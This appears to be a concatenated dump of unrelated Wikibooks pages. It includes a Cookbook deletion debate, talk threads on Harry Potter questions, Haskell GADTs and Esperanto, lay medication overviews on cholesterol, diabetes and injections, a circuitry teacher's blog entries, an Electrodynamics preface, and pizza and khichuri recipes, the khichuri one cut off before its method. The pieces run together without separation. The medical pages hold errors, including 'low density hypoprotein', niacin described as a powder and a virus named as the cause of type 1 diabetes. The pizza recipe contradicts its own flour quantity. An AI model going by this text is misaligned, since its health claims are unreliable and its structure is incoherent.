**I would agree with a rewrite. The whole while I read it, it felt like a stereotypical &quot;vegan health nut&quot; was breathing down my neck, telling me to go halfway around the world to get some fresh tofu, but not to neglect local growers, but to make sure that all food is perfect, et. al. Also, it contradicts itself at one point IIRC, stating that you should buy from 3rd world countries because they need the money, and then in the same sentence stating that local growers need money too. Very confusing, very POV, very little help. [[User:24.205.34.217|24.205.34.217]] 20:06, 23 May 2007 (UTC)
* [[Cookbook:Faggot]] - no measurements
**Now has measurements. (Webaware)
* [[Cookbook:Ernie_Salad]] - somebody's personal essay about a crappy recipe
**Ernie, it was said, loved to talk about himself in the third person. Delete this Americanised Greek salad. (Webaware)
* [[Cookbook:Fantasy_and_Mythical_cuisines]] - dumb
** - I have '''no''' problem deleting this one and will do so later unless there is an objection (Herby).  Then I thought that Kellen might &quot;rnjoy&quot; dealing with this so I'll leave it! (H)
**Category is surplus to requirements. (Webaware)
* [[Cookbook:Fruitmince]] - personal essay
**A rambling memoir that should be moved to the discussion page and replaced with a summary in recipe format. (Webaware)
* [[Cookbook:Hot and Spicy Dip]] - seriously this is really stupid
**Already gone. Was it at least funny? I don't remember it from my quick scan the other day. (Webaware)
* &lt;s&gt;[[Cookbook:Italian_Pasta]]&lt;/s&gt; - merge with [[Cookbook:Pasta]]
* [[Cookbook:Marrow]] - no improvement since 2004, wrong place, etc
**Could become a recipe one day, but hasn't yet. Besides, the best thing about stuffed marrows is the stuffing, which would be better expended on something flavoursome like eggplant. (Webaware)
* [[Cookbook:Nature]] - old WP naming of this page, makes no sense, content of questionable worth at best
* [[Cookbook:Pasta_alla_Carbonara]] - dupe of [[Cookbook:Spaghetti alla Carbonara]]
**Duplicate, as identified. Delete this version. (Webaware)
* [[Cookbook:Fred_Steak]] - seem(s|ed) like a sneaky ad, but I suppose there is a recipe nested in there somewhere.
** Strip the ad - keep the recipe? (Herby)
**Sounds ridiculous enough to be a modern American classic. If people want to shove that crap down their throats, who are we to prevent them from cooking their own nasty version of it? (Webaware)
If no objections one week from today, I shall delete them. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 08:09, 5 April 2007 (UTC)

:G'day Kellen, I had a quick browse and see some problems with your proposal. Some are junk, some are better stated in other recipes, some should be merged into other Cookbook pages, and some just need some copy editing. I'll attempt to address each one in detail, but not today. ITMT, can you explain why you want to delete the smoothie recipes? They seem fine to me, if a little thin on detail.

Some are - the [[Cookbook:Fantasy_and_Mythical_cuisines]] is one I would delete without any real concern but I think some actual reasons are necessary for any that really are going to go.  A general &quot;I don't like them&quot; would cover quite a few bits of Wikibooks for me. --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 10:36, 6 April 2007 (UTC)

::: Ok. I had put these on my scratch page as things I thought should go, but I did it oh, 8 or 9 months ago, so I'm not 100% sure why I wanted to delete each one. It appears that some of them have actually become salvagable (e.g. Chicken riggies), whereas before I did not think they were worth the effort of trying to fix.

===Simple recipes===
Regarding Kellen's comments on &quot;obvious&quot; recipes, I'm starting to accept that there is no such thing any more. I'm on several food-related email lists (for various reasons) and have been utterly gobsmacked by the inability of many people to cope with the simplest of cooking concepts, a problem fostered by our packet-food-based society. 

For some people, recipes with more than two ingredients and/or two steps to the procedure are simply too daunting to contemplate. Don't take simple recipes for granted, as they can be a nice first step away from the processed food industry for some people.

:Agreeing with this.  A while back a celeb chef in the UK did a &quot;basic cookery&quot; TV series and got slated/loads of publicity for doing one show on &quot;cooking eggs&quot;.  When the fuss died down (quickly) the series was well received.  I wonder how many folk actually learnt quite a bit from the series (I did) and whether there were not quite a few who got into cooking (and away from junk) via this.  Some simple stuff is good --[[User:Herbythyme|&lt;font color=&quot;green&quot;&gt;Herby&lt;/font&gt;]] &lt;b&gt;&lt;sup&gt;&lt;small&gt;&lt;span style=&quot;color:#90F&quot;&gt;[[User talk:Herbythyme|talk thyme]]&lt;/span&gt;&lt;/small&gt;&lt;/sup&gt;&lt;/b&gt; 12:18, 7 April 2007 (UTC)

: What I think the WB cookbook could best do is fully and completely describe basic cookery concepts. This is not often done in cookbooks, nor is this type of information commonly available on the internets. I tend to think our recipes are generally crap, and I wouldn't shed a tear if 90% of our recipes were nuked. On the other hand, centralized information about ingredients and cooking techniques are invaluable; some of our pages are already quite good in this respect. [[User:Kellen|Kellen]]&amp;nbsp;&lt;sup&gt;[[User_talk:Kellen|T]]&lt;/sup&gt; 12:49, 7 April 2007 (UTC)

::I generally agree - there is a lot of poorly written stuff here, but I wouldn't be so quick to rip it all out - it's useful to someone, but could do with a bit of loving care. However, I'm totally with you on the cookery concepts bit. It troubles me that so many people are completely reliant on packet foods these days, especially given how crap most packet food is. Herby's comment about eggs rings a few bells too - both from being stunned at seeing a recipe for fried eggs in a recipe book, and from meeting people who manage to stuff them up ''every time''. I quite like how some of the ingredients pages here tell you what to do with the ingredients, and I think this and the cooking techniques pages should definitely be expanded. All we really need is indefinite time to do it all, and money to keep us going while we're doing it, right? :/ [[User:Webaware|Webaware]]&amp;nbsp;&lt;sup&gt;[[User_talk:Webaware|talk]]&lt;/sup&gt; 13:38, 7 April 2007 (UTC)

I'm relatively new to the editing end of wikis in general, but it strikes me that recipes of all stripe should be here.  What's childishly simple for one is insanely complex for another.  Rather than remove simple recipes, why not tag them as needing improvement, or linking to related, more challenging recipes?  Just my 2 cents.

I think the project-wide VfD should only be used for Wikibooks policy violations when the authors of the book fail to solve the problem and for the deletion of entire books, not for individual pages in an established book. In my view, the discussion here is appropriate. If other eyes are needed after this discussion, than either post a note at VfD or move the discussion there for a wider participation.

:{{comment}} - 1) On the subject of this particular module, it seems to be a food essay. I don't know if food essays have been included in the past, or if we want them in the future. This is the first I remember seeing. 2) This essay is getting dangerously close to the &quot;no original research&quot; policy. However, here at the cookbook we get close to that policy all the time, as many of the recipes are technically &quot;original research&quot;. We might need to revise the cookbook's policies in this area to establish where to draw the &quot;NOR&quot; line. [[User:Gentgeen|Gentgeen]] 18:37, 27 April 2007 (UTC)

== Random recipe ==

would it be possible to put a link (either in the main page or ideally in the side bar) that links to a random recipe? i think it would be a good featuer for the cookbook wikibook as unlike most of the books a cook book is normally read in a random order! &lt;small&gt;—The preceding [[w:Wikipedia:Sign your posts on talk pages|unsigned]] comment was added by [[User:144.82.192.102|144.82.192.102]] ([[User talk:144.82.192.102|talk]] • [[Special:Contributions/144.82.192.102|contribs]]) 2007-05-06T07:35:38.&lt;/small&gt;

:I don't know how easy this would be to do. It's easy enough to make a random page link to any Cookbook page, using [[Special:Random/Cookbook]], but what you're suggesting would be a random page link to pages in [[:Category:Recipes]] - don't know how to do that without a custom script (either server side, or some really bandwidth-heavy Javascript).

      <text xml:space="preserve">==Questions sections==

Most of the detailed plot summaries come with chapter-by-chapter &quot;Questions&quot; sections. These are a tad unuseful &quot;to the scholar&quot; if they don't also come with answers. For instance, in chapter 1 of the philosopher's stone, we have the question &quot;4) Who was You-Know-Who?&quot;. It would be a little more informative to have some information, either beside it or below in another section, saying &quot;Question 4 is answered in Chapter 4, Book 1&quot;. Or similar. Some questions posed early on aren't answered until Book 7, others are answered in 3 pages - this vital information is not made clear. Anyone wishing for answers could only possibly find them in this manner by searching page by page through our synopses. --[[User:86.5.99.65|86.5.99.65]] 14:30, 2 July 2007 (UTC)

:I disagree. Literary criticism questions are often left unanswered in review books since they often don't have a straight answer. These kinds of questions are often what we desire to write since they make the reader reflect and stay interested in the material, looking for deeper answers as they read. A straightforward question could be answered like you say, but that is left up to the reader to find. With casual reading that question can be answered, and it's much too important to give away so early. These questions should intertwine the works and deliver a stronger understanding of the topics involved. -[[User:Withinfocus|&lt;font color=&quot;#000000&quot;&gt;'''within'''&lt;/font&gt;]][[User talk:Withinfocus|&lt;font color=&quot;#7A7A7A&quot;&gt;'''focus'''&lt;/font&gt;]] 00:37, 3 July 2007 (UTC)</text>

      <text xml:space="preserve">== About Example: Trouble with GADTs ==

We can define SafeList in the following manner, without such troubles:

&lt;pre&gt;
data Empty
data NonEmpty

data SafeList :: * -&gt; * -&gt; * where
     Nil  :: SafeList x Empty
     Cons :: x -&gt; SafeList x y  -&gt; SafeList x z

safeHead :: SafeList x NonEmpty -&gt; x
safeHead (Cons x _) = x

-- bad typed as before
--bad = safeHead Nil

-- OK
silly 0 = Nil
silly 1 = Cons 1 Nil
&lt;/pre&gt;

:Nice. Thanks.  Can you please update the page with some discussion? -- [[User:Kowey|Kowey]] 15:07, 2 July 2007 (UTC)

:That doesn't buy you much, though: &lt;pre&gt;safeHead (silly 1)&lt;/pre&gt; still fails.

== About Example: Existential Types ==
The bits about TE2/TG2 talk about &quot;heterogenous lists&quot;, but that's inaccurate.
Each TE2/TG2 instance contains a homogeneous list of b's (the existentially-quantified type).
Of course, each instance may use a different b. (Paul Steckler)

== Poorly written, but gets the point across ==

I think somebody made this point about this (stub) article on #haskell.  Criticism gratefully received!  Any takers?  For what it's worth, I always found the examples used explaining GADT to be a little hard to understand (it took quite a while for them to really sink in).  Some nice new examples would be useful.  Also Ganesh's talk in LondonHUG seems to do a pretty good job explaining GADTs.  Worth borrowing some ideas from him -- [[User:Kowey|Kowey]] ([[User talk:Kowey|talk]]) 09:13, 25 February 2008 (UTC)

:I had some time and digged up examples:
:*[http://www.londonhug.net/2008/02/02/video-darcs-and-gadts/ Ganesh's talk in LondonHUG] GADTs for patches.
:*[http://research.microsoft.com/~simonpj/papers/gadt/ SPJ - type inference for GADTs] (rewritten version of the wobbly paper). Features the standard expression evaluator example.
:*[http://lambda-the-ultimate.org/node/290#comment-2210 LtU - Prototyping new monads] Term implementation for the state monad.
:*[http://www.informatik.uni-bonn.de/~ralf/publications/With.pdf Hinze - Fun with Phantom Types] Strongly typed &lt;code&gt;printf&lt;/code&gt;. (It's possible to do that without GADTs, though). Generic programming (= representing types as values).
:*This wikibook: safe lists.
:*Fixed size vectors/matrices. Other invariants like AVL or red-black trees.
:So, most examples emphasize safety, but I think the one that does not is the most compelling one. Its basic message is: with GADTs, pretty much every abstract data type has a term-implementation, that can be used to cook up its implementation. That's enough to warrant GADTs in the language and makes a good starting point for the wikibook. Unfortunately, it's the state monad, which may create unwanted associations in the reader's mind... I wonder whether there is a different example without troubling ballast.
:Btw, I think the word &quot;safety&quot; should be replaced by &quot;more precise types&quot; or &quot;more fine-grained types&quot; or something; just a feeling.
:-- [[User:Apfelmus|apfe&lt;b&gt;&amp;lambda;&lt;/b&gt;mus]] 17:25, 25 February 2008 (UTC)
:More example goodness:
:*[http://lambda-the-ultimate.org/node/1293 LtU - How are GADTs useful in practical programming?]. Meta-resource.
:*[http://web.cecs.pdx.edu/~sheard/papers/silly.pdf Augustsson,Petersson - Silly Type Families] Parser combinators as GADTs, they're not monadic. The intention is to automatically left-factor easy grammars, you need an (G)ADT for that. But I think that these combinators can be recast as applicative functors, eliminating the need for &lt;code&gt;Seq :: Grammar a -&gt; Grammar b -&gt; Grammar (a,b)&lt;/code&gt; which forces the extension to GADTs. Not sure whether left-factoring is still feasible then, though. If it ever was...
:*[http://www.cs.nott.ac.uk/~nhn/Publications/icfp2005.pdf Yampa] GADTs enable optimizations by cutting down dynamic checks, or so I hear.
:*[http://people.cs.uu.nl/andres/Contract.pdf Contracts for functional programming]. An embedded DSL for dynamically checking constraints (&quot;contracts&quot;), i.e. more invariants but dynamically checked. GADTs make the implementation easy / make it possible at all.

== Comments ==

I watched the first few minutes of the video mentioned on apfeλmus's blog.[http://apfelmus.nfshost.com/blog/2010-06-01-gadts-video.html]  I generally like the text medium much better than video.  Video works better if it shows a person giving a lecture, there are animated demonstrations, that sort of thing.  The video did have a few examples that appeared in handwriting that were helpful, but I think they could be integrated into the text.  About the content itself, what's here is reasonably good, but it could use expansion.  I found the assertion &quot;GADT's are mostly useful for EDSL's&quot; to be surprising, though EDSL's are a good example.  Darcs uses GADT's in an interesting way, to track complicated invariants of patches.  GADT's are considered by some to be a gateway drug to dependent types, so I'd be interested to see how they can be used for nontrivial code verification.  I'd also like to see an example of using an existential wrapper to introduce GADT-typed values from external data.  I've fooled around with code like that, but have never understood the idea well enough to do anything interesting with it.  [[Special:Contributions/75.57.243.88|75.57.243.88]] ([[User talk:75.57.243.88|talk]]) 21:48, 2 June 2010 (UTC)

:Thanks for your comment! :-)
:I take it that you didn't like the video format because of the pace? The great advantage of text is indeed that the reader can choose the pace and can also glance at the overall structure.
:Since the video is only an introduction, I didn't include material on dependent types. That would be a second video / text. ;-)
:-- [[User:Apfelmus|apfe&lt;b&gt;&amp;lambda;&lt;/b&gt;mus]] 19:38, 3 June 2010 (UTC)

::Yes, I guess it's mostly that the video and text have about the same content, but with text it's much easier to adjust reading speed depending on difficulty of the passage, go over a section again, that sort of thing.  The video is like having the text read out loud, which is not that useful.  Maybe it departs more from the text further in--I might watch the rest of it sometime just to see if it makes a difference.  Video is useful for informal presentations where you're speaking somewhat off the cuff, and that's less work than preparing a complete text.  But if you're writing the text anyway, the video doesn't gain much.  Video can also be useful at the other extreme, where you have elaborate productions of moving images, but that's even more work.  If you're serious about adding some dependent type material, that would be great, I'm looking forward to seeing it.

:::The text here is pretty much a transcription of what I said off the cuff in the video. Well, or what I was still saying in the sixth take. :-) Pleasantly, this meant that the text didn't take much work to prepare.
:::Curiously, some things don't work so well in text, like discussing code &quot;incrementally&quot;, i.e. writing it, underlining parts that they don't type check, rewriting the type signature, that sort of thing. That's what's happening in the subsection &quot;Extending the language&quot;, but it just doesn't have the same look and feel as in the video.
:::Anyway, I'm preparing another video experiment, stay tuned. ;-)

The article notes briefly that GADTs subsume existential types, but it also subsumes (at least partly) functional dependencies, doesn't it?  This is nice information to have for e.g. me, who are familiar with the old ways, and want to learn how GADTs fit in. [[User:Ketil|Ketil]] ([[User talk:Ketil|talk]]) 14:07, 5 July 2010 (UTC)

Is there a way to say Esperanto in German? Just curious. -Drury

: Of course there is. Esperanto is very big in Germany. The word is simply &quot;Esperanto&quot; (with a German pronunciation, not too far from the Esperanto pronunciation of the word). [[User:Junesun|Junesun]] 06:00, 3 July 2007 (UTC)</text>

      <text xml:space="preserve">There are several types of medications used to lower cholesterol. But first, a few words on what the problem is. 

In the human body, cholesterol is an important chemical, which is used to make vital hormones like testosterone and estradiol. It is manufactured in the body, or can be ingested in the diet, and absorbed in the intestinal tract.

There are several '''subtypes of cholesterol'''. When one says &quot;my cholesterol is good&quot;, it usually refers to the total cholesterol. There is one subtype called '''high density lipoprotein''' (HDL for short), which is considered the &quot;good&quot; cholesterol. The higher this is, the better. Another subtype is called '''low density hypoprotein''', or &quot;bad&quot; cholesterol. Over the years, physicians have been lowering what they consider to be &quot;safe&quot; LDL, and for most people it is now lower than 100. (For people at &quot;high risk&quot; of complications, like diabetics, it is below 70.) There are other subtypes as well, but they are less important clinically. 

The evidence for high cholesterol being linked to cardiovascular disease like heart attacks and strokes took decades to glean from the data of hundreds of scientific studies. Even though the cholesterol values currently account for only about 50% of the causes of cardiovascular disease, efforts to lower these levels have resulted in dramatic drops in morbidity and mortality. So much effort is expended to aid people in understanding what their personal cholesterol levels are, how their diet can contribute to it, and if high, how changing their diet and other lifestyle parameters can reduce their risk.

Some medications to lower cholesterol work by trying to &quot;bind&quot; it in the intestinal tract before it actually enters the blood stream. Although this can work for some people, and a high fiber diet that helps is nearly always good for us, it is unlikely to change the cholesteral values much by itself. 

The most commonly prescribed cholesterol lowering medications in the US today are called '''statins''', for short. They include medications with names like Lipitor, lovastatin, mevacor, etc. They work quite well for most people, and some work better than others. Your clinician can help chose the one for you. They have a serious side effect of damaging muscles, which is uncommon, but not rare. After going on a statin, your clinician should draw blood to ensure the medication is not causing you harm. 

Niacin is another cholesterol lowering medication, usually taken as a powder. It's side effects include &quot;flushing&quot;, where one turns red, like a menopausal hot flash.

== An incredible happening in my teacher's life ==

''December 30, 2007''

The story that I have told here is the most incredible happening in my teacher's life. I have been teaching circuitry for more than 20 years. I have been having good,  responsive, clever, curious, capable and even talented students that have been helping and inspiring me in my pursuit of revealing the truth about circuits through these years. But, as a rule, my best students loose interest in the subject after passing the examination. I have received sporadically emails from some of them at that when they need some help.

[[Image:Sinusoid_1000.jpg|right|thumb|300px|&lt;center&gt;How does a sinusoidal oscillation conceive in an LC tank?&lt;/center&gt;]]

That's why, imagine how much I was amazed when Cyril whom I was teaching basic circuitry two years ago, came on one of my consultation hours and showed willingness for discussing circuit phenomena. In the beginning, I supposed that Cyril has just to pass some examination or he has failed to take an examination or he has to make a project... But imagine how much I was amazed when I knew that Cyril wanted just to understand circuits! He brought out a few textbooks, showed to me obscure circuit diagrams of various oscillators and told me that he had not understood anything from these explanations. He just wanted to know why, when and how oscillations arise, where currents flow, why the inductor and capacitor of an LC tank discharge completely, what make energy circulate between the two component of the LC circuit, what transistors and op-amps do in oscillating circuits, how an RC oscillator oscillates although it does not actually contain any oscillating circuit, etc. Then I started reading the vague texts and, as a result, I realized that I also do not understand them. I knew but I didn't realize the basic ideas behind these great phenomena.

It happened half a month ago; since that time I have no peace. I stopped writing temporarily the introductory methodological stories of [[Circuit Idea|Circuit idea]] and began thinking about oscillation phenomena. During my consultation hours Cyril and I discuss these famous circuits. Usually, our &quot;brainstorming sessions&quot; last two hours. I record them on a solid-state recorder; then I write down them on a paper and finally I use the valuable thoughts in creating circuit stories. So, I would like to dedicate the exciting introductory story about the philosophy of oscillations in this world to Cyril who has inspired me to start and then to keep this series of stories.

== Joining students to Circuit idea ==

''March, 2008''

In the beginning of March, 2008 I decided to [[Circuit Idea/Technical University of Sofia|join  my students]] to ''Circuit idea''. I started this initiative &quot;in sport&quot; but it turned out so successful and exciting that now I am entirely absorbed in this new web undertaking. I have told how it has begun in the [[Talk:Circuit Idea/Walking along the Resistive Film|discussion]] of the first completely finished page that my students and I have dedicated to the famous [[Circuit Idea/Walking along the Resistive Film|Ohm's experiment]].

After I saw the rapturous reactions of my students I realized the potentialities of this approach and began enlarging this educational experiment. For this purpose, I have created separate pages of all the ten student groups ([[Circuit Idea/Group_64a|64a]], [[Circuit Idea/Group_65a|65a]], [[Circuit Idea/Group_66a|66a]], [[Circuit Idea/Group_67a|67a]], [[Circuit Idea/Group_68a|68a]], [[Circuit Idea/Group_64b|64b]], [[Circuit Idea/Group_65b|65b]], [[Circuit Idea/Group_66b|66b]], [[Circuit Idea/Group_67b|67b]] and [[Circuit Idea/Group_68b|68b]]). In these group pages, my students and I, all together, have been placing what we have done in the laboratory and the lecture hall - photos, drawings, texts, etc. During labs and lectures I record our conversations and discussions by a small solid-state recorder and make snaps by a digital camera; some students do the same. The photos show drafts on the whiteboard, screen shots, laboratory setups, the very students (and sometimes, their teacher:), etc. On returning at home I download the records and pictures to my computer and begin processing them. In order to help students, I outline briefly the structure of the future modules in the student and talk pages; then I place all the raw materials (pictures) in the pages. I add also links to useful resources and some provoking questions. Then I leave students to go on developing the stories; I only intervene in their works from time to time to edit and refine them. Finally, I expand student works by adding more explanations and use these materials to create the according modules. You can see how I have placed (on the right) links in the list of [[Circuit Idea#Started_circuit_stories_under_discussion|started circuit stories]] pointing to the corresponding student pages.
 
You can imagine how powerful this approach is where students and their teacher, all together, work on the same common project! They add, edit and continuously refine it; they learn how to present what they have done to other, how to contribute a wiki project, how to communicate with people, etc. Furthermore, any web visitors (including other students and their teachers) through the world can join and enrich this open project! It is just wonderful! I have started a [[Circuit Idea/Joining_Students_of_TU_Sofia|concrete page]] where to tell how I have joined students from Technical University of Sofia to Wikibooks. Also, I have prepared a link to a more general [[Circuit Idea/Joining Students to Wikibooks|story]] about joining students; we might discuss this idea in the [[Talk:Circuit Idea/Joining Students to Wikibooks|talk]] page. If you are a teacher, student or you just like education, join our web initiative! Here are links to my student groups:

&lt;center&gt;[[Circuit Idea/Group 64a|Group 64a]] • [[Circuit Idea/Group 65a|Group 65a]] • [[Circuit Idea/Group 66a|Group 66a]] • [[Circuit Idea/Group 67a|Group 67a]] • [[Circuit Idea/Group 68a|Group 68a]] • [[Circuit Idea/Group 64b|Group 64b]] • [[Circuit Idea/Group 65b|Group 65b]] • [[Circuit Idea/Group 66b|Group 66b]] • [[Circuit Idea/Group 67b|Group 67b]] • [[Circuit Idea/Group 68b|Group 68b]]&lt;/center&gt;</text>

      <text xml:space="preserve">Medicines for Diabetes Mellitus (or DM, for short) are many in number, and can improve the body's dysfuntion in many ways. 

Fred Banting and Charles Best, in the summer of 1921, first extracted insulin from cells of the pancreas and tested it on diabetic dogs. They had discovered a treatment for a disease that since the beginning of time would kill by wasting away, sometimes in a coma, because of high blood levels of a sugar called '''glucose'''. Soon humans were being treated of this dread condition, called Diabetes Mellitus, and able to go on with their lives. 

Nearly a century later, DM is still being studied around the world, with new research showing new treatments every year. There are two major types, called now called '''type 1''' and '''type 2'''. Type 1 seems to be caused by a virus, with a sudden onset of the destruction of the islet cells in the pancreas which make insulin, usually in childhood. Type 2 seems to be caused by a &quot;wearing out&quot; of these same cells that suggest they have been &quot;overworked&quot; for decades. 

There are many problems that the poor control of blood sugar seems to cause in people, including 
*'''retinopathy''' of the eyes, where tiny blood vessels break and bleed, causing blindness
*'''peripheral neuropathy''', where the longest nerves of the body, those from the spinal cord to the feet, stop working normally, causing numbness and pain
*'''cardiovascular disease''' like strokes and heart attacks, and blockage of arteries, usually the small ones, that can lead to loss of limbs
*'''renal nephropathy''' or kidney disease, which can lead to elevated blood pressure and the need for frequent kidney dialysis in the extreme form
*other less common complications

Treatment of Type 1 DM requires a comprehensive team of people working with the patient and family to help balance the food being injested with the energy expended, with the right amount and type of insulin. 

Treatment of Type 2 DM can be a challenge to patients for a different reason.  Although they initially may not require injections of insulin, because of old habits established decades ago they need to adjust their diets and exercise patterns.

Both forms of DM require a close attention to diet, a good exercise plan, attention to detail in caring for onself, and ending life threatening behaviors like smoking cigarettes and drinking alcohol and sugared drinks. 

There are many types of insulin available today. Some are short acting, intended to work within minutes, and some long acting, working over hours. In the past, most were derived from the pancreas of beef or pork, but today most are made in the laboratory using a '''recombinant DNA''' technology. Almost all have to be injected into the body to work, as the insulin molecule will not withstand the body's digestive system. (There is a new type that has recently hit the market that allow one to use an inhaler, where the insulin is delivered to the lungs instead of using a needle.)

Medications for Type 2 DM are many, and are aimed at solving the problem in different ways. 
* Knowing that fat cells become resistant to insulin as they get larger (they seem to lose the receptors that bind the insulin) led to the discovery of '''Biguanides''' like '''metformin''' which seems to increase the receptors and therefore lower the amount of insulin needed. Metformin also reduced the liver's production of glucose. 
* Getting the pancreas &quot;to work harder&quot; and put more of the body's insulin into the bloodstream is the function of '''secretagogues''', which include the '''sulfonylureas'''. There are first and second generation drugs which have been developed over time. 
* Another class is the '''Thiazolidinediones''', which combine the effects of the two classes mentioned above. 
* Yet another class of medications, calle '''Alpha-Glucosidase Inhibitors''' reduce the speed with with the body absorbs the glucose from the intestines after a meal. This delay reduces the need for the insulin that occurs because the body &quot;sees&quot; so much need after a meal
* A new class of medications called '''GLP-1 receptor agonists''' or '''incretin mimetics''' affect hormones called '''incretins''', which assist the pancreas in signalling the need for additional insulin only when the blood sugar is actually high. 
* This field changes so fast that there are likely to be new medications not present on this list since the last time this section was updated.

{{recipesummary|Pizza recipes|4-6 (2 medium pizzas: 8 slices each)|90 minutes|3|Image=[[Image:PeperonniPizza.jpg|300px]]}}

==Ingredients==
;Pizza dough:
* 1 [[Cookbook:cup|cup]] of warm [[Cookbook:water|water]] 
* 3 [[Cookbook:tablespoon|tbsp]] of [[Cookbook:Yeast|yeast]]
* 1 tbsp of [[Cookbook:Sugar|sugar]]
* 1 [[Cookbook:pound|lb]] of [[Cookbook:flour|all purpose flour]]
* ¼ [[Cookbook:cup|cup]] of [[Cookbook:Olive Oil|olive oil]]

;Toppings:
* [[Cookbook:Pepperoni|pepperoni]]
* 8 [[Cookbook:Ounce|oz]]. of [[Cookbook:Mozzarella Cheese|mozzarella cheese]]
* ½ 15[[Cookbook:Ounce|oz]]. can of Hunt's Family Favorites Pizza sauce
* 1 small [[Cookbook:Onion|onion]] finely diced
* 1 small [[Cookbook:Bell Pepper|red pepper]] finely diced
* 3 ½ [[Cookbook:Ounce|oz]]. of sliced [[Cookbook:Mushroom|mushrooms]]
* [[Cookbook:Oregano|oregano]], [[Cookbook:Salt|salt]], and [[Cookbook:Pepper|black pepper]]

==Procedure==
# Dissolve yeast and sugar in one cup or warm water.
# Mix 3 cups of flour, olive oil, one [[Cookbook:Teaspoon|tsp]] of salt and water &amp; yeast mix.
# Knead for 15 minutes, adding more flour until dough gets &quot;non-sticky&quot;.
# Cover dough with little oil (1 tsp) and place it into a large bowl. Let rest 45 minutes until the dough is twice its original size, covering bowl with plastic wrap.
# Meanwhile, preheat oven at 350°F / 175°C (at least 30 minutes).
# Hit / knead dough in order to eliminate air bubbles.
# Cut dough into two pieces (you can freeze dough to bake later - up to a month).
# Roll out dough to form a rounded pizza crust.
# Add pizza sauce (½ can per pizza), and sprinkle onion, red pepper, salt, oregano and black pepper.
# Bake 10 minutes.
# Take out of the oven, add mozzarella cheese, pepperoni, and mushrooms.
# Take back to the oven and bake until cheese melts.
# Cut into eight slices, and enjoy!!!

==Variations, Tips==
# Water must be warm in order to activate yeast, but not boiling. Boiling water will spoil yeast.
# You can replace ¼ of water cup with milk, white or red wine.
# You can also replace sugar with 1 tbsp of honey.
# If you like a stronger cheese flavor, you can add on top of ingredients, little chunks of blue cheese.
# Never wash the mushrooms with water, in order to make pizza. Mushrooms are like sponges, and will lose unwanted water to your pizza. You can clean it with dry paper towels.
# You can try different toppings to basic pizza dough, and even add cheese borders. To do so, you should roll out pizza into a larger size, adding cheese one [[Cookbook:Inch|inch]] from the border, and little pizza sauce. Roll dough over the cheese and press firmly to close.

      <text xml:space="preserve">Medicines that must be delivered directly into the body through the skin are called injectible medication.

There are two areas medicines are placed. The '''subcutaneous''' area is just under that skin, but not in the muscle. When the needle is placed deeper, it is targeted for the muscle itself, called '''intramuscular'''.

The choice of whether the injection should be subcutaneous or intramuscular has to do with the medication being injected, and how well it is absorbed in either site. 
*Insulin is perhaps the most commonly used subcutaneous injection
*Vaccinations or antibiotics are generally given intramuscularly.

Certain medications will be deactivated by the body (usually the liver) so quickly that to give them orally is worthless. These are usually given through injection
*Testosterone for replacement of male hypogonadism is given intramuscularly.

== Welcome ==

Welcome to the Electrodynamics wikibook. This book is a wiki, so all readers are welcome to contribute to the book to help make it better.

== Who is this book for? ==

This book is part of a series of books on [[Modern Physics]], and is intended to be read by advanced undergraduate students in the fields of physics or engineering.

== What will this book cover? ==

This book is going to introduce and discuss the topics of the electric field and the magnetic field. We are going to discuss the effects of relativity on these fields. We are also going to introduce tensors as a method to describe these fields under transformation.

== What are the prerequisites? ==

Before reading this book, the reader should have a solid background in calculus (especially multivariable or &quot;vector&quot; calculus), differential equations, and elementary physics. Some books that will be useful are:

*[[Calculus]]
*[[Ordinary Differential Equations]]
*[[Linear Algebra]]
*[[Real Analysis]]
*[[Engineering Analysis]]

== Notations ==

This book will rely on a variety of mathematical notations. We will follow this convention, where possible:

*Scalars will be ''italic''. Scalars will be denoted with a lower-case letter, or a Greek letter.
*Vectors will be '''bold''' and lower-case.
*Vector fields, tensors, and matrices will be '''bold''' and upper-case.
*A cross (×) will denote the vector cross-product, not scalar multiplication.
*Where possible, when an equation or mathematical term needs to be embedded in the text of a page, it will be rendered as HTML, not in TeX.
*Parenthesis will be used to denote the arguments to a function, such as σ('''r'''). Subscripts will be used to denote elements from inside a vector, such as '''p'''&lt;sub&gt;1&lt;/sub&gt; for numbered elements, and '''B'''&lt;sub&gt;x&lt;/sub&gt; for elements that correspond to a particular coordinate.

'''Khichuri''' is a Bengali cuisine once considered comfort food for the poor, now is a delicacy served warm in Monsoon rain. Like similar [[Cookbook:Khichdi|Khichdi]], core ingredients are [[Cookbook:rice|rice]] and [[Cookbook:lentil|lentil]]s, but different variations exist, some adding vegetables, poultry or meat and named accordingly (e. g. ''Sabji khichuri'' for vegetable). Here is the recipe for the popular ''Bhuna Khichuri''.   

== Ingredients ==
[[Image:Khichuri-edit.jpg|thumb|Khichuri before garnish. Note the yellow colour is from Turmeric powder, lentils never give such vibrant colur.]]
*1 [[Cookbook:cup|cup]] white fragrant [[Cookbook:rice|rice]] (e.g Bashmati rice or short grained Pilau rice)
*1 cup green gram or red split [[Cookbook:lentil|lentil]]s (rice : lentil should be 1:1)
*½ cup split [[Cookbook:chickpea|chickpea]]s (preferably dried Bengal variety) (optional)
*½ cup [[Cookbook:Pea|garden peas]] (optional)
*2 [[Cookbook:tablespoon|tablespoon]]s [[Cookbook:butter|butter]] preferably [[Cookbook:ghee|ghee]]
*½ [[Cookbook:teaspoon|teaspoon]] [[Cookbook:Turmeric|turmeric powder]] (to give the dish a vibrant yellow colour)
*2 whole green [[Cookbook:Chili Pepper|chili]]s slit in the middle, de-seeded if heat is not desired
*[[Cookbook:salt|salt]] according to taste
*4 cups of water for boiling
'''Spices for seasoning'''
*2 [[Cookbook:Bay Leaf|bay leaves]]
*4 [[Cookbook:Cardamom|green cardamom pods]]
*4 whole [[Cookbook:Clove|cloves]]
*2 sticks of [[Cookbook:cinnamon|cinnamon]] 1 inch long
*¼ teaspoon [[Cookbook:Cumin|cumin seeds]]
*2 cm piece of [[Cookbook:ginger|ginger]], finely chopped
'''For garnish'''
*1 medium or 2 small [[Cookbook:Onion|onions]], thinly sliced
*2 tablespoons [[Cookbook:butter|butter]] preferably [[Cookbook:ghee|ghee]]
*1 bunch coarsely chopped fresh [[Cookbook:Coriander|coriander]] leaves

== Procedure ==


